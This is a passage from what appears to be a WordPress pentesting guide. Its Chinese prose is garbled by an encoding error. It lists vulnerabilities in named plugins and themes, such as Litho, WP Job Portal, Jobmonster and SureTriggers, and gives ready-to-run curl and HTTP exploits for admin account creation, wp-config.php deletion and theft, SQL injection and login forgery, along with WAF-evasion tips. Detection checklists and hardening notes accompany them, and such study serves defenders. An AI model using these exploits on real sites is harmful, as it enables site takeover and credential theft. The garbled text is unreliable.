X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
ä¸ºä»€ä¹ˆå®ƒæœ‰æ•ˆ

- è¯¥æ’ä»¶å°†å®¢æˆ·ç«¯å¯æ§çš„ header æ˜ å°„åˆ°è®¤è¯çŠ¶æ€ï¼Œå¹¶è·³è¿‡ capability checksã€‚
- WordPress core æœŸæœ›æ­¤è·¯ç”±å…·æœ‰ `create_users` capabilityï¼›è¯¥æ’ä»¶åˆ©ç”¨æ­¤ç‚¹ï¼Œé€šè¿‡ç›´æ¥ä» header è®¾ç½®å½“å‰ç”¨æˆ·ä¸Šä¸‹æ–‡æ¥ç»•è¿‡å®ƒã€‚

é¢„æœŸæˆåŠŸæŒ‡æ ‡

- è¿”å› HTTP 201ï¼Œä¸”å“åº”ä½“ä¸ºæè¿°å·²åˆ›å»ºç”¨æˆ·çš„ JSONã€‚
- åœ¨ `wp-admin/users.php` ä¸­å¯è§ä¸€ä¸ªæ–°çš„ç®¡ç†å‘˜ç”¨æˆ·ã€‚

æ£€æµ‹æ¸…å•

- Grep for `getallheaders()`, `$_SERVER['HTTP_...']`, or vendor SDKs that read custom headers to set user context (e.g., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- å®¡æŸ¥ REST æ³¨å†Œï¼ŒæŸ¥æ‰¾ç¼ºä¹å¥å£® `permission_callback` æ£€æŸ¥ã€ä¸”ä¾èµ–è¯·æ±‚ header çš„ç‰¹æƒå›è°ƒã€‚
- æŸ¥æ‰¾åœ¨ REST å¤„ç†å™¨å†…ä»…ä»¥ header å€¼ä¸ºé—¨æ§çš„æ ¸å¿ƒç”¨æˆ·ç®¡ç†å‡½æ•° (`wp_insert_user`, `wp_create_user`) çš„ä½¿ç”¨ã€‚

### é€šè¿‡ wp_ajax_nopriv çš„æœªç»è®¤è¯ä»»æ„æ–‡ä»¶åˆ é™¤ (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. ä¸€ä¸ª **capability check**ï¼ˆä¾‹å¦‚ `current_user_can()` æˆ–è‡³å°‘ `is_user_logged_in()`ï¼‰ï¼Œä»¥åŠ
2. ä¸€ä¸ªé€šè¿‡ `check_ajax_referer()` / `wp_verify_nonce()` éªŒè¯çš„ **CSRF nonce**ï¼Œä»¥åŠ
3. **ä¸¥æ ¼çš„è¾“å…¥æ¶ˆæ¯’/éªŒè¯**ã€‚

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
* **æœªç»èº«ä»½éªŒè¯çš„è®¿é—®** â€“ å·²æ³¨å†Œ `wp_ajax_nopriv_` é’©å­ã€‚
* **No nonce / capability check** â€“ ä»»ä½•è®¿å®¢éƒ½å¯ä»¥è®¿é—®è¯¥ç«¯ç‚¹ã€‚
* **No path sanitisation** â€“ ç”¨æˆ·å¯æ§çš„ `fontfamily` å­—ç¬¦ä¸²åœ¨æœªè¿‡æ»¤çš„æƒ…å†µä¸‹è¢«æ‹¼æ¥åˆ°æ–‡ä»¶ç³»ç»Ÿè·¯å¾„ä¸­ï¼Œå…è®¸ç»å…¸çš„ `../../` ç›®å½•éå†ã€‚

#### åˆ©ç”¨

æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ä¸€ä¸ª HTTP POST è¯·æ±‚ï¼Œåˆ é™¤ä½äº **uploads åŸºç›®å½•ä»¥ä¸‹** çš„ä»»æ„æ–‡ä»¶æˆ–ç›®å½•ï¼ˆé€šå¸¸æ˜¯ `<wp-root>/wp-content/uploads/`ï¼‰ï¼š
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
å› ä¸º `wp-config.php` ä½äº *uploads* ä¹‹å¤–ï¼Œé»˜è®¤å®‰è£…ä¸­å››ä¸ª `../` å°±è¶³å¤Ÿäº†ã€‚åˆ é™¤ `wp-config.php` ä¼šåœ¨ä¸‹ä¸€æ¬¡è®¿é—®æ—¶å¼ºåˆ¶ WordPress è¿›å…¥ *å®‰è£…å‘å¯¼*ï¼Œä»è€Œå…è®¸å®Œå…¨æ¥ç®¡ç«™ç‚¹ï¼ˆæ”»å‡»è€…åªéœ€æä¾›æ–°çš„ DB é…ç½®å¹¶åˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·ï¼‰ã€‚

å…¶ä»–æœ‰å½±å“çš„ç›®æ ‡åŒ…æ‹¬æ’ä»¶/ä¸»é¢˜çš„ `.php` æ–‡ä»¶ï¼ˆç”¨äºç ´åå®‰å…¨æ’ä»¶ï¼‰æˆ– `.htaccess` è§„åˆ™ã€‚

#### æ£€æµ‹æ¸…å•

* ä»»ä½•è°ƒç”¨æ–‡ä»¶ç³»ç»Ÿè¾…åŠ©å‡½æ•°ï¼ˆ`copy()`, `unlink()`, `$wp_filesystem->delete()` ç­‰ï¼‰çš„ `add_action( 'wp_ajax_nopriv_...')` å›è°ƒã€‚
* å°†æœªç»è¿‡æ»¤çš„ç”¨æˆ·è¾“å…¥ä¸²è”è¿›è·¯å¾„ï¼ˆæŸ¥æ‰¾ `$_POST`, `$_GET`, `$_REQUEST`ï¼‰ã€‚
* ç¼ºå°‘ `check_ajax_referer()` å’Œ `current_user_can()`/`is_user_logged_in()`ã€‚

---

### é€šè¿‡è¿‡æ—¶è§’è‰²æ¢å¤å’Œç¼ºå¤±æˆæƒè¿›è¡Œçš„æƒé™æå‡ (ASE "View Admin as Role")

è®¸å¤šæ’ä»¶é€šè¿‡åœ¨ user meta ä¸­ä¿å­˜åŸå§‹è§’è‰²ä»¥å®ç° "view as role" æˆ–ä¸´æ—¶è§’è‰²åˆ‡æ¢åŠŸèƒ½ï¼Œä»¥ä¾¿ä¹‹åè¿˜åŸã€‚å¦‚æœè¿˜åŸæµç¨‹ä»…ä¾èµ–è¯·æ±‚å‚æ•°ï¼ˆä¾‹å¦‚ `$_REQUEST['reset-for']`ï¼‰å’Œæ’ä»¶ç»´æŠ¤çš„åˆ—è¡¨ï¼Œè€Œæ²¡æœ‰æ£€æŸ¥ capabilities å’Œæœ‰æ•ˆçš„ nonceï¼Œè¿™å°±ä¼šæˆä¸ºä¸€æ¬¡å‚ç›´æƒé™æå‡ã€‚

åœ¨å®é™…æ¡ˆä¾‹ä¸­ï¼ŒAdmin and Site Enhancements (ASE) æ’ä»¶ï¼ˆâ‰¤ 7.6.2.1ï¼‰å­˜åœ¨æ­¤é—®é¢˜ã€‚reset åˆ†æ”¯åœ¨å†…éƒ¨æ•°ç»„ `$options['viewing_admin_as_role_are']` ä¸­å‡ºç°è¯¥ç”¨æˆ·åæ—¶ï¼Œä¼šæ ¹æ® `reset-for=<username>` æ¢å¤è§’è‰²ï¼Œä½†åœ¨ç§»é™¤å½“å‰è§’è‰²å¹¶ä» user meta `_asenha_view_admin_as_original_roles` é‡æ–°æ·»åŠ å·²ä¿å­˜è§’è‰²ä¹‹å‰ï¼Œæ—¢æ²¡æœ‰æ‰§è¡Œ `current_user_can()` æ£€æŸ¥ï¼Œä¹Ÿæ²¡æœ‰è¿›è¡Œ nonce éªŒè¯ï¼š
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
ä¸ºä»€ä¹ˆå¯è¢«åˆ©ç”¨

- ä¿¡ä»» `$_REQUEST['reset-for']` å’Œä¸€ä¸ªæ’ä»¶é€‰é¡¹ï¼Œè€Œæ²¡æœ‰è¿›è¡ŒæœåŠ¡ç«¯æˆæƒã€‚
- å¦‚æœæŸç”¨æˆ·ä¹‹å‰åœ¨ `_asenha_view_admin_as_original_roles` ä¸­ä¿å­˜äº†æ›´é«˜æƒé™å¹¶è¢«é™çº§ï¼Œä»–ä»¬å¯ä»¥é€šè¿‡è®¿é—®é‡ç½®è·¯å¾„æ¢å¤è¿™äº›æƒé™ã€‚
- åœ¨æŸäº›éƒ¨ç½²ä¸­ï¼Œä»»ä½•å·²è®¤è¯ç”¨æˆ·éƒ½å¯ä»¥ä¸ºä»å­˜åœ¨äº `viewing_admin_as_role_are` çš„å¦ä¸€ä¸ªç”¨æˆ·åè§¦å‘é‡ç½®ï¼ˆæˆæƒç¼ºé™·ï¼‰ã€‚

åˆ©ç”¨ï¼ˆç¤ºä¾‹ï¼‰
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
åœ¨æ˜“å—æ”»å‡»çš„æ„å»ºä¸­ï¼Œè¿™ä¼šç§»é™¤å½“å‰è§’è‰²å¹¶é‡æ–°æ·»åŠ å·²ä¿å­˜çš„åŸå§‹è§’è‰²ï¼ˆä¾‹å¦‚ `administrator`ï¼‰ï¼Œä»è€Œå®ç°æƒé™æå‡ã€‚

æ£€æµ‹æ¸…å•

- æŸ¥æ‰¾åœ¨ user meta ä¸­æŒä¹…åŒ– â€œoriginal rolesâ€ çš„è§’è‰²åˆ‡æ¢åŠŸèƒ½ï¼ˆä¾‹å¦‚ `_asenha_view_admin_as_original_roles`ï¼‰ã€‚
- è¯†åˆ«é‡ç½®/è¿˜åŸè·¯å¾„ï¼Œè¿™äº›è·¯å¾„ï¼š
- ä» `$_REQUEST` / `$_GET` / `$_POST` è¯»å–ç”¨æˆ·åã€‚
- é€šè¿‡ `add_role()` / `remove_role()` ä¿®æ”¹è§’è‰²ï¼Œè€Œæ²¡æœ‰ä½¿ç”¨ `current_user_can()` å’Œ `wp_verify_nonce()` / `check_admin_referer()`ã€‚
- åŸºäºæ’ä»¶é€‰é¡¹æ•°ç»„ï¼ˆä¾‹å¦‚ `viewing_admin_as_role_are`ï¼‰è¿›è¡Œæˆæƒï¼Œè€Œä¸æ˜¯åŸºäºæ“ä½œè€…çš„èƒ½åŠ›ã€‚

---

### Unauthenticated privilege escalation via cookieâ€‘trusted user switching on public init (Service Finder â€œsf-bookingâ€)

ä¸€äº›æ’ä»¶å°†ç”¨æˆ·åˆ‡æ¢è¾…åŠ©å‡½æ•°æŒ‚åˆ°å…¬å…±çš„ `init` hookï¼Œå¹¶ä»å®¢æˆ·ç«¯å¯æ§çš„ cookie ä¸­æ¨æ–­èº«ä»½ã€‚å¦‚æœä»£ç åœ¨æœªéªŒè¯èº«ä»½ã€èƒ½åŠ›å’Œæœ‰æ•ˆ nonce çš„æƒ…å†µä¸‹è°ƒç”¨ `wp_set_auth_cookie()`ï¼Œä»»ä½•æœªè®¤è¯çš„è®¿é—®è€…éƒ½å¯ä»¥å¼ºåˆ¶ä»¥ä»»æ„ç”¨æˆ· ID ç™»å½•ã€‚

Typical vulnerable pattern (simplified from Service Finder Bookings â‰¤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
ä¸ºä½•å¯è¢«åˆ©ç”¨

- å…¬å…±çš„ `init` hook ä½¿å¾—è¯¥å¤„ç†ç¨‹åºå¯¹æœªè®¤è¯çš„ç”¨æˆ·å¯è¾¾ï¼ˆæ²¡æœ‰ `is_user_logged_in()` ä¿æŠ¤ï¼‰ã€‚
- èº«ä»½æ¥è‡ªäºå¯ç”±å®¢æˆ·ç«¯ä¿®æ”¹çš„ cookieï¼ˆ`original_user_id`ï¼‰ã€‚
- å¯¹ `wp_set_auth_cookie($uid)` çš„ç›´æ¥è°ƒç”¨ä¼šå°†è¯·æ±‚è€…ä»¥è¯¥ç”¨æˆ·èº«ä»½ç™»å½•ï¼Œè€Œä¸ä¼šè¿›è¡Œä»»ä½• capability/nonce æ£€æŸ¥ã€‚

åˆ©ç”¨ï¼ˆæ— éœ€èº«ä»½éªŒè¯ï¼‰
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF å¯¹ WordPress/plugin CVEs çš„è€ƒè™‘

é€šç”¨çš„ edge/server WAFs é’ˆå¯¹å¹¿æ³›æ¨¡å¼ï¼ˆSQLi, XSS, LFIï¼‰è¿›è¡Œè°ƒä¼˜ã€‚è®¸å¤šé«˜å±çš„ WordPress/plugin æ¼æ´æ˜¯ç‰¹å®šäºåº”ç”¨çš„é€»è¾‘/è®¤è¯ç¼ºé™·ï¼Œé™¤éæ£€æµ‹å¼•æ“ç†è§£ WordPress è·¯ç”±å’Œ plugin è¯­ä¹‰ï¼Œå¦åˆ™è¿™äº›è¯·æ±‚çœ‹èµ·æ¥åƒæ­£å¸¸æµé‡ã€‚

æ”»å‡»æç¤º

- é’ˆå¯¹ plugin ç‰¹å®šç«¯ç‚¹ä½¿ç”¨å¹²å‡€çš„ payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- å…ˆæµ‹è¯•æœªè®¤è¯è·¯å¾„ï¼ˆAJAX `nopriv`, REST ä¸­å¸¦å®½æ¾çš„ `permission_callback`, å…¬å¼€ shortcodesï¼‰ã€‚é»˜è®¤ payloads å¾€å¾€åœ¨ä¸åšæ··æ·†çš„æƒ…å†µä¸‹å°±èƒ½æˆåŠŸã€‚
- å¸¸è§çš„é«˜å±æƒ…å†µï¼šæƒé™æå‡ï¼ˆbroken access controlï¼‰ã€ä»»æ„æ–‡ä»¶ä¸Šä¼ /ä¸‹è½½ã€LFIã€open redirectã€‚

é˜²å¾¡æç¤º

- ä¸è¦ä¾èµ–é€šç”¨ WAF ç­¾åæ¥ä¿æŠ¤ plugin CVEsã€‚åº”å®æ–½åº”ç”¨å±‚ã€é’ˆå¯¹å…·ä½“æ¼æ´çš„è™šæ‹Ÿè¡¥ä¸ï¼Œæˆ–å°½å¿«æ›´æ–°ã€‚
- åœ¨ä»£ç ä¸­ä¼˜å…ˆä½¿ç”¨æ­£å‘å®‰å…¨æ£€æŸ¥ï¼ˆcapabilitiesã€noncesã€ä¸¥æ ¼çš„è¾“å…¥éªŒè¯ï¼‰ï¼Œè€Œä¸æ˜¯åŸºäºå¦å®šçš„ regex è¿‡æ»¤ã€‚

## WordPress Protection

### Regular Updates

ç¡®ä¿ WordPressã€plugins å’Œ themes å·²æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚è¿˜è¦ç¡®è®¤åœ¨ wp-config.php ä¸­å¯ç”¨äº†è‡ªåŠ¨æ›´æ–°ï¼š
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
æ­¤å¤–ï¼Œ**ä»…å®‰è£…å¯ä¿¡çš„ WordPress æ’ä»¶å’Œä¸»é¢˜**ã€‚

### å®‰å…¨æ’ä»¶

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **å…¶ä»–å»ºè®®**

- ç§»é™¤é»˜è®¤çš„ **admin** ç”¨æˆ·
- ä½¿ç”¨ **å¼ºå¯†ç ** å’Œ **2FA**
- å®šæœŸ **å®¡æŸ¥** ç”¨æˆ· **æƒé™**
- **é™åˆ¶ç™»å½•å°è¯•** ä»¥é˜²æ­¢ Brute Force æ”»å‡»
- é‡å‘½å **`wp-admin.php`** æ–‡ä»¶ï¼Œå¹¶ä»…å…è®¸å†…éƒ¨æˆ–ç‰¹å®š IP åœ°å€è®¿é—®ã€‚


### æœªç»èº«ä»½éªŒè¯çš„ SQL Injectionï¼ˆç”±äºéªŒè¯ä¸è¶³ï¼‰ï¼ˆWP Job Portal <= 2.3.2ï¼‰

WP Job Portal æ‹›è˜æ’ä»¶æš´éœ²äº†ä¸€ä¸ª **savecategory** ä»»åŠ¡ï¼Œæœ€ç»ˆåœ¨ `modules/category/model.php::validateFormData()` ä¸­æ‰§è¡Œäº†ä»¥ä¸‹æ˜“å—æ”»å‡»çš„ä»£ç ï¼š
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
æ­¤ç‰‡æ®µå¼•å…¥çš„é—®é¢˜ï¼š

1. **æœªæ¸…ç†çš„ç”¨æˆ·è¾“å…¥** â€“ `parentid` ç›´æ¥æ¥è‡ª HTTP è¯·æ±‚ã€‚
2. **WHERE å­å¥ä¸­çš„å­—ç¬¦ä¸²æ‹¼æ¥** â€“ æ²¡æœ‰ä½¿ç”¨ `is_numeric()` / `esc_sql()` / prepared statementã€‚
3. **æ— éœ€è®¤è¯å³å¯è®¿é—®** â€“ è™½ç„¶è¯¥ action é€šè¿‡ `admin-post.php` æ‰§è¡Œï¼Œä½†å”¯ä¸€çš„æ£€æŸ¥æ˜¯ **CSRF nonce**ï¼ˆ`wp_verify_nonce()`ï¼‰ï¼Œä»»ä½•è®¿é—®è€…éƒ½å¯ä»¥ä»åµŒå…¥äº†çŸ­ä»£ç  `[wpjobportal_my_resumes]` çš„å…¬å…±é¡µé¢è·å–åˆ°ã€‚

#### åˆ©ç”¨

1. è·å–ä¸€ä¸ªæ–°çš„ nonceï¼š
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. é€šè¿‡æ»¥ç”¨ `parentid` æ³¨å…¥ä»»æ„ SQLï¼š
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
å“åº”ä¼šè¿”å›æ³¨å…¥æŸ¥è¯¢çš„ç»“æœæˆ–ä¿®æ”¹æ•°æ®åº“ï¼Œä»è€Œè¯æ˜å­˜åœ¨ SQLiã€‚


### æœªè®¤è¯çš„ä»»æ„æ–‡ä»¶ä¸‹è½½ / è·¯å¾„éå† (WP Job Portal <= 2.3.2)

å¦ä¸€ä¸ªä»»åŠ¡ **downloadcustomfile** å…è®¸è®¿é—®è€…é€šè¿‡è·¯å¾„éå†ä¸‹è½½ç£ç›˜ä¸Šçš„ **ä»»æ„æ–‡ä»¶**ã€‚æ˜“å—æ”»å‡»çš„ sink ä½äº `modules/customfield/model.php::downloadCustomUploadedFile()`ï¼š
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` æ˜¯ attacker-controlled å¹¶åœ¨æ‹¼æ¥æ—¶ **æœªç»è¿‡æ¸…ç†**ã€‚å†æ¬¡ï¼Œå”¯ä¸€çš„é—¨æ§›æ˜¯ä¸€ä¸ª **CSRF nonce**ï¼Œå¯ä»¥ä»ç®€å†é¡µé¢è·å–ã€‚

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
The server responds with the contents of `wp-config.php`, leaking DB credentials and auth keys.

## æœªç»èº«ä»½éªŒè¯çš„è´¦æˆ·æ¥ç®¡é€šè¿‡ Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

è®¸å¤šä¸»é¢˜/æ’ä»¶é€šè¿‡ admin-ajax.php æš´éœ²â€œsocial loginâ€è¾…åŠ©ç¨‹åºã€‚å¦‚æœä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„ AJAX åŠ¨ä½œ (wp_ajax_nopriv_...) åœ¨æä¾›è€…æ•°æ®ç¼ºå¤±æ—¶ä¿¡ä»»å®¢æˆ·ç«¯æä¾›çš„æ ‡è¯†ç¬¦ï¼Œå¹¶éšåè°ƒç”¨ wp_set_auth_cookie()ï¼Œå°±ä¼šå¯¼è‡´å®Œå…¨çš„èº«ä»½éªŒè¯ç»•è¿‡ã€‚

å…¸å‹çš„æœ‰ç¼ºé™·çš„æ¨¡å¼ï¼ˆç®€åŒ–ï¼‰
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider â€“ execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // ğŸ”¥ logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
ä¸ºä½•å¯è¢«åˆ©ç”¨

- å¯åœ¨æœªè®¤è¯æƒ…å†µä¸‹é€šè¿‡ admin-ajax.phpï¼ˆwp_ajax_nopriv_â€¦ actionï¼‰è®¿é—®ã€‚
- åœ¨çŠ¶æ€æ›´æ”¹ä¹‹å‰æ²¡æœ‰ nonce/capability checksã€‚
- ç¼ºå°‘ OAuth/OpenID provider éªŒè¯ï¼›é»˜è®¤åˆ†æ”¯æ¥å—æ”»å‡»è€…è¾“å…¥ã€‚
- get_user_by('email', $_POST['id']) éšåè°ƒç”¨ wp_set_auth_cookie($uid) ä¼šå°†è¯·æ±‚è€…è®¤è¯ä¸ºä»»æ„å­˜åœ¨çš„é‚®ç®±åœ°å€ã€‚

åˆ©ç”¨ï¼ˆæœªè®¤è¯ï¼‰

- å…ˆå†³æ¡ä»¶ï¼šæ”»å‡»è€…èƒ½å¤Ÿè®¿é—® /wp-admin/admin-ajax.php å¹¶çŸ¥é“/çŒœæµ‹æœ‰æ•ˆçš„ç”¨æˆ·é‚®ç®±ã€‚
- å°† provider è®¾ç½®ä¸ºä¸å—æ”¯æŒçš„å€¼ï¼ˆæˆ–çœç•¥ï¼‰ä»¥è§¦å‘é»˜è®¤åˆ†æ”¯å¹¶ä¼ é€’ id=<victim_email>ã€‚
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
é¢„æœŸæˆåŠŸæŒ‡æ ‡

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Web æ—¥å¿—æ˜¾ç¤ºæœªç»èº«ä»½éªŒè¯çš„ POST è¯·æ±‚åˆ° /wp-admin/admin-ajax.phpï¼Œå¸¦æœ‰ social-login action å’Œ id=<email>ã€‚
- ä»ç›¸åŒ IP/User-Agent ç´§æ¥å‡ºç°æˆåŠŸ JSON çš„ 200 å“åº”ï¼Œéšåå‡ºç°å·²è®¤è¯æµé‡ã€‚

Hardening

- ä¸è¦ä»å®¢æˆ·ç«¯è¾“å…¥æ¨å¯¼èº«ä»½ã€‚åªæ¥å—æ¥æºäºå·²éªŒè¯ provider token/ID çš„ç”µå­é‚®ç®±/IDã€‚
- å³ä¾¿æ˜¯ login helpersï¼Œä¹Ÿè¦è¦æ±‚ CSRF nonces å’Œ capability checksï¼›é™¤éç»å¯¹å¿…è¦ï¼Œå¦åˆ™é¿å…æ³¨å†Œ wp_ajax_nopriv_ã€‚
- åœ¨æœåŠ¡å™¨ç«¯éªŒè¯å’Œæ ¡éªŒ OAuth/OIDC å“åº”ï¼›æ‹’ç»ç¼ºå¤±/æ— æ•ˆçš„ providersï¼ˆä¸è¦å›é€€åˆ° POST idï¼‰ã€‚
- è€ƒè™‘æš‚æ—¶ç¦ç”¨ social login æˆ–åœ¨è¾¹ç¼˜è¿›è¡Œè™šæ‹Ÿæ‰“è¡¥ä¸ï¼ˆé˜»æ–­æ˜“å—æ”»å‡»çš„ actionï¼‰ï¼Œç›´åˆ°ä¿®å¤ã€‚

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers â‰¤ 1.0.82)

ä¸€äº›æ’ä»¶æš´éœ² REST endpointsï¼Œä¼šé“¸é€ å¯é‡ç”¨çš„ â€œconnection keysâ€ æˆ– tokensï¼Œè€Œä¸éªŒè¯è°ƒç”¨è€…çš„ capabilitiesã€‚å¦‚æœè·¯ç”±ä»…å¯¹å¯çŒœæµ‹çš„å±æ€§ï¼ˆä¾‹å¦‚ usernameï¼‰è¿›è¡Œè®¤è¯ï¼Œä¸”æ²¡æœ‰å°† key ç»‘å®šåˆ°å¸¦æœ‰ capability checks çš„ user/sessionï¼Œä»»ä½•æœªç»è®¤è¯çš„æ”»å‡»è€…éƒ½å¯ä»¥é“¸é€ ä¸€ä¸ª key å¹¶è°ƒç”¨æœ‰ç‰¹æƒçš„æ“ä½œï¼ˆåˆ›å»º admin è´¦å·ã€æ’ä»¶æ“ä½œ â†’ RCEï¼‰ã€‚

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC â€“ mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# â†’ {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
ä¸ºä½•å¯è¢«åˆ©ç”¨
- æ•æ„Ÿçš„ REST è·¯ç”±ä»…ç”±ä½ç†µçš„èº«ä»½å‡­è¯ï¼ˆusernameï¼‰æˆ–ç¼ºå¤±çš„ permission_callback ä¿æŠ¤
- æ²¡æœ‰ capability å¼ºåˆ¶ï¼›ç”Ÿæˆçš„å¯†é’¥è¢«å½“ä½œé€šç”¨ç»•è¿‡

æ£€æµ‹æ¸…å•
- ä½¿ç”¨ grep åœ¨æ’ä»¶ä»£ç ä¸­æœç´¢ register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- ä»»ä½•åŸºäºè¯·æ±‚æä¾›çš„èº«ä»½ï¼ˆusername/emailï¼‰å‘æ”¾ tokens/keys çš„è·¯ç”±ï¼Œä¸”æœªç»‘å®šåˆ°å·²è®¤è¯ç”¨æˆ·æˆ– capability
- æŸ¥æ‰¾åç»­è·¯ç”±ï¼Œå®ƒä»¬åœ¨æ²¡æœ‰æœåŠ¡å™¨ç«¯ capability æ£€æŸ¥çš„æƒ…å†µä¸‹æ¥å—ç”Ÿæˆçš„ token/key

åŠ å›º
